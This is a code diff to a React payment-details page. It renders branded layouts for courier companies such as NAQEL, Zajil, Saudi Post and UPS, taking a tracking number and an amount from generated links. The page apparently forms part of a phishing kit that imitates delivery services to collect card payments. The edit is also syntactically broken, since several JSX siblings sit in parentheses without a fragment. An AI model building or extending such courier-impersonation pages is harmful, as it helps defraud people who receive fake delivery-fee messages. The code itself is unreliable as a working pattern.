@@ -1,6 +1,8 @@
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getCompanyLayout } from "@/components/CompanyLayouts";
+import { NAQELLayout, ZajilLayout, SaudiPostLayout, UPSLayout } from "@/components/MoreCompanyLayouts";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
@@ -16,6 +18,25 @@ const PaymentDetails = () => {
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
+
+  const getLayout = () => {
+    const key = serviceKey.toLowerCase();
+    switch (key) {
+      case 'naqel':
+        return NAQELLayout;
+      case 'zajil':
+        return ZajilLayout;
+      case 'saudipost':
+        return SaudiPostLayout;
+      case 'ups':
+        return UPSLayout;
+      default:
+        const CompanyLayout = getCompanyLayout(serviceKey);
+        return CompanyLayout;
+    }
+  };
+
+  const LayoutComponent = getLayout();
 
   // Get country code from link data
   const countryCode = shippingInfo?.selectedCountry || "SA";
@@ -55,15 +76,7 @@ const PaymentDetails = () => {
     }
   };
   
-  return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
-      amount={formattedAmount}
-      title="تفاصيل الدفع"
-      description={`صفحة دفع آمنة ومحمية لخدمة ${serviceName}`}
-      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
-    >
+  const paymentContent = (
       {/* Shipping Info Display */}
       {shippingInfo && (
         <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
@@ -152,7 +165,16 @@ const PaymentDetails = () => {
       <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
         بالمتابعة، أنت توافق على الشروط والأحكام
       </p>
-    </DynamicPaymentLayout>
+  );
+
+  return (
+    <LayoutComponent
+      companyKey={serviceKey}
+      trackingNumber={shippingInfo?.tracking_number}
+      amount={formattedAmount}
+    >
+      {paymentContent}
+    </LayoutComponent>
   );
 };
 
